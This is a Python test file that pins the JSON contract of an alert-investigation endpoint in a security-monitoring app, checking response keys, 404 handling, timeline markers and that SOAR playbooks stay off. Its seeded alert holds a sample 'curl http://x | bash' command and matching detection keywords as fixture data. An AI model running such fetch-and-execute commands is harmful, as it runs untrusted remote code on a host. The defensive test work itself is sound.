"""
test_investigation_service.py — characterization + regression tests for the
Alert Investigation JSON endpoint (GET /api/alerts/{id}/investigation).

Written BEFORE the get_investigation_data extraction to pin the exact response
shape, the 404 behaviour, the no-related-events path, and the auto_run_for_alert
side effect, so the extraction into services/investigation_service.py can be
proven behaviour-preserving.

Mirrors the isolated-app + in-memory-sqlite pattern used by test_metrics_auth.py.
auto_run_for_alert is patched to a no-op so the tests are deterministic and do
not depend on SOAR playbook internals; SOAR timeline entries are seeded directly.
"""
import asyncio
import json
from datetime import datetime, timedelta
from unittest.mock import patch

import httpx
from fastapi import FastAPI
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from app import db as _db_module
from app import models
from app.models import Base
from app.auth.dependencies import require_api_auth
from app.routers.api_metrics import router as metrics_router

# ---------------------------------------------------------------------------
# Isolated app + in-memory DB
# ---------------------------------------------------------------------------

_engine = create_engine(
    "sqlite:///:memory:",
    connect_args={"check_same_thread": False},
    poolclass=StaticPool,
)
Base.metadata.create_all(_engine)
_TestSession = sessionmaker(bind=_engine)


def _override_get_db():
    s = _TestSession()
    try:
        yield s
    finally:
        s.close()


_app = FastAPI()
_app.include_router(metrics_router)
_app.dependency_overrides[_db_module.get_db] = _override_get_db
_app.dependency_overrides[require_api_auth] = lambda: None


def _get(path: str) -> httpx.Response:
    transport = httpx.ASGITransport(app=_app)

    async def _run():
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as ac:
            return await ac.get(path)

    return asyncio.get_event_loop().run_until_complete(_run())


# ---------------------------------------------------------------------------
# Seeding helpers
# ---------------------------------------------------------------------------

_ALERT_TS = datetime(2026, 1, 1, 12, 0, 0)
_SOURCE_IP = "10.0.0.5"


def _clear():
    s = _TestSession()
    for model in (models.SOARActionExecution, models.Metric, models.Log,
                  models.AlertAssessment, models.Alert):
        s.query(model).delete()
    s.commit()
    s.close()


def _seed_full() -> int:
    """Seed an alert with assessment, an in-window correlated log, a metric, and
    a SOAR execution. Returns the alert id."""
    s = _TestSession()
    alert = models.Alert(
        timestamp=_ALERT_TS,
        host="vps-1",
        severity="high",
        title="[rule-x] Suspicious shell",
        description=f"Shell exec from {_SOURCE_IP}\n\nRAW_LOG: curl http://x | bash",
        source="T1059",
        is_read=False,
        agent_id="agent-1",
        rule_id="rule-x",
        rule_name="Suspicious shell",
        risk_score=67,
        mitre_tactic="TA0002",
        mitre_technique="T1059.004",
        detection_engine="YAML",
        detection_metadata=json.dumps({"match_reasons": ["curl", "| bash"]}),
    )
    s.add(alert)
    s.commit()
    alert_id = alert.id

    s.add(models.AlertAssessment(
        alert_id=alert_id, status="Investigating", analyst_notes="looking into it",
    ))
    s.add(models.Log(
        timestamp=_ALERT_TS - timedelta(minutes=2),
        host="vps-1", log_type="auditd", file_path="/var/log/audit/audit.log",
        message=f"curl {_SOURCE_IP} downloaded payload",
    ))
    s.add(models.Metric(
        timestamp=_ALERT_TS - timedelta(minutes=1),
        host="vps-1", cpu_percent="42.5", ram_percent="61.0",
        net_in_bytes="1000", net_out_bytes="2000",
    ))
    s.add(models.SOARActionExecution(
        alert_id=alert_id, playbook_id="pb-1", playbook_name="Shell PB",
        action_id="a-1", action_name="create_case_note", action_type="create_case_note",
        target="rule-x", mode="simulation", status="success", executed_by="system:auto",
        executed_at=_ALERT_TS + timedelta(minutes=1),
    ))
    s.commit()
    s.close()
    return alert_id


def _seed_minimal() -> int:
    """Alert only — no assessment, logs, metrics, or SOAR events."""
    s = _TestSession()
    alert = models.Alert(
        timestamp=_ALERT_TS, host="lonely-host", severity="low",
        title="[rule-y] Minimal", description="nothing related here",
        source="Not-MITRE", is_read=True, rule_id="rule-y", rule_name="Minimal",
        risk_score=20, detection_engine="YAML",
    )
    s.add(alert)
    s.commit()
    alert_id = alert.id
    s.close()
    return alert_id


# Expected response contract (top-level + nested keys) ------------------------

_TOP_KEYS = {
    "alert", "rule_name", "mitre_technique", "source_ip", "assessment",
    "correlated_events", "timeline", "endpoint_health", "source_intel",
}
_ALERT_KEYS = {
    "id", "title", "severity", "host", "timestamp", "description", "source",
    "is_read", "rule_id", "rule_name", "risk_score", "mitre_tactic",
    "mitre_technique", "detection_engine", "detection_metadata",
}
_ASSESSMENT_KEYS = {"status", "analyst_notes", "updated_at"}
_SOURCE_INTEL_KEYS = {"source_ip", "geolocation", "asn", "alert_count", "alert_count_label"}


# ---------------------------------------------------------------------------
# Tests
# ---------------------------------------------------------------------------

def test_full_investigation_response_shape():
    _clear()
    alert_id = _seed_full()
    with patch("app.soar.response_service.auto_run_for_alert") as mock_soar:
        resp = _get(f"/api/alerts/{alert_id}/investigation")
    assert resp.status_code == 200
    body = resp.json()

    # top-level + nested key contract
    assert set(body.keys()) == _TOP_KEYS
    assert set(body["alert"].keys()) == _ALERT_KEYS
    assert set(body["assessment"].keys()) == _ASSESSMENT_KEYS
    assert set(body["source_intel"].keys()) == _SOURCE_INTEL_KEYS

    # value/format behaviour
    assert body["alert"]["severity"] == "HIGH"            # upper-cased
    assert body["alert"]["timestamp"] == "2026-01-01 12:00:00"
    assert isinstance(body["alert"]["detection_metadata"], dict)   # json.loads'd
    assert body["alert"]["description"] == f"Shell exec from {_SOURCE_IP}"  # RAW_LOG stripped
    assert body["source_ip"] == _SOURCE_IP
    assert body["assessment"]["status"] == "Investigating"
    assert body["source_intel"]["alert_count_label"] == "Alerts from Same Source IP"

    # endpoint health present
    assert body["endpoint_health"]["available"] is True
    assert body["endpoint_health"]["cpu"] == 42.5

    # read-only: the investigation GET must NOT trigger SOAR auto-run
    mock_soar.assert_not_called()


def test_timeline_ordering_and_markers():
    _clear()
    alert_id = _seed_full()
    with patch("app.soar.response_service.auto_run_for_alert"):
        body = _get(f"/api/alerts/{alert_id}/investigation").json()
    timeline = body["timeline"]

    # the pending step is always last (frontend depends on this)
    assert timeline[-1].get("is_pending") is True
    # the alert itself is flagged, and a SOAR event is injected
    assert any(e.get("is_alert") for e in timeline)
    assert any(e.get("is_soar") for e in timeline)
    # correlated_events include the alert marker row
    assert any(e.get("is_alert") for e in body["correlated_events"])


def test_missing_alert_returns_404():
    _clear()
    with patch("app.soar.response_service.auto_run_for_alert") as mock_soar:
        resp = _get("/api/alerts/999999/investigation")
    assert resp.status_code == 404
    assert resp.json()["detail"] == "Alert not found"
    # auto_run must NOT run for a missing alert (404 short-circuits first)
    mock_soar.assert_not_called()


def test_alert_with_no_related_events_still_returns_full_shape():
    _clear()
    alert_id = _seed_minimal()
    with patch("app.soar.response_service.auto_run_for_alert"):
        resp = _get(f"/api/alerts/{alert_id}/investigation")
    assert resp.status_code == 200
    body = resp.json()
    assert set(body.keys()) == _TOP_KEYS
    assert body["endpoint_health"] == {"available": False}
    assert body["assessment"]["status"] == "New"        # default when no row
    assert body["assessment"]["updated_at"] is None
    assert body["source_ip"] is None
    assert body["source_intel"]["alert_count_label"] == "Alerts from Same Host"
    # timeline still has the alert event + pending step
    assert any(e.get("is_alert") for e in body["timeline"])
    assert body["timeline"][-1].get("is_pending") is True


def test_repeated_fetch_has_no_side_effects():
    _clear()
    alert_id = _seed_full()
    with patch("app.soar.response_service.auto_run_for_alert") as mock_soar:
        first = _get(f"/api/alerts/{alert_id}/investigation").json()
        second = _get(f"/api/alerts/{alert_id}/investigation").json()

    # read-only: no SOAR auto-run on any fetch, so no duplicate executions possible
    mock_soar.assert_not_called()
    # no duplicate SOAR timeline entries across repeated fetches (we seeded one)
    soar_first = [e for e in first["timeline"] if e.get("is_soar")]
    soar_second = [e for e in second["timeline"] if e.get("is_soar")]
    assert len(soar_first) == len(soar_second) == 1
    # response shape stable across calls
    assert set(first.keys()) == set(second.keys()) == _TOP_KEYS


def test_service_callable_without_http_and_does_not_commit():
    """Direct service call returns the same contract, and the read path performs
    no commit of its own (the only write is the patched-out SOAR auto-run)."""
    from app.services import investigation_service

    _clear()
    alert_id = _seed_full()
    session = _TestSession()
    session.commit = lambda *a, **k: (_ for _ in ()).throw(  # type: ignore
        AssertionError("investigation read path must not commit")
    )
    try:
        with patch("app.soar.response_service.auto_run_for_alert"):
            body = investigation_service.get_investigation_data(session, alert_id)
    finally:
        session.close()

    assert set(body.keys()) == _TOP_KEYS
    assert body["alert"]["id"] == alert_id
